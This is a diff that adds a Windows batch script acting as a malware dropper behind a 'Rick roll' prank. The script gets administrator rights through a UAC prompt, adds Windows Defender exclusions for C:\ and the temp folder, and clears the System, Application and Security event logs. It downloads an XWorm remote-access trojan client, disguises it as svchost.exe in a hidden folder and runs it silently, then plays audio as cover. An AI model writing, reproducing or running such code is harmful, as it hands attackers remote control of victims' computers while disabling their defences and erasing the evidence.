@@ -1,0 +1,52 @@
+��&cls
+@echo off
+
+set "params=%*"
+cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (
+  echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+  echo UAC.ShellExecute "cmd.exe", "/c """"%~s0"" %params:""=""^&""""", "", "runas", 0 >> "%temp%\getadmin.vbs"
+  "%temp%\getadmin.vbs"
+  exit /B
+)
+
+color 00
+mode con cols=1 lines=1
+title Windows
+
+powershell -Command "Add-MpPreference -ExclusionPath 'C:\'" >nul 2>&1
+
+powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%'" >nul 2>&1
+
+wevtutil cl System >nul 2>&1
+wevtutil cl Application >nul 2>&1
+wevtutil cl Security >nul 2>&1
+
+if not exist "C:\indiva" mkdir "C:\indiva" >nul 2>&1
+attrib +s +h "C:\indiva" >nul 2>&1
+
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Pythonist310/tt5435/raw/1e43a0f0bb5a4f9b0f294813f9ea6e35b755af00/XWormClient.exe' -OutFile 'C:\indiva\svchost.exe'" >nul 2>&1
+
+powershell -Command "Start-Process -FilePath 'C:\indiva\svchost.exe' -WindowStyle Hidden" >nul 2>&1
+
+del /f /q "%temp%\*" >nul 2>&1
+
+cd /d "C:\indiva"
+
+curl -L -o "1.mp3" "ССЫЛКА_НА_1_MP3"
+curl -L -o "rick.bat" "ССЫЛКА_НА_RICK_BAT"
+
+echo Set Player = CreateObject("WMPlayer.OCX") > play.vbs
+echo Player.URL = "C:\indiva\1.mp3" >> play.vbs
+echo Player.controls.play >> play.vbs
+echo do while Player.playState ^< ^> 1 >> play.vbs
+echo WScript.Sleep 100 >> play.vbs
+echo loop >> play.vbs
+
+start /b wscript.exe play.vbs
+
+start "" "rick.bat"
+
+timeout /t 2 >nul
+del play.vbs
+
+exit
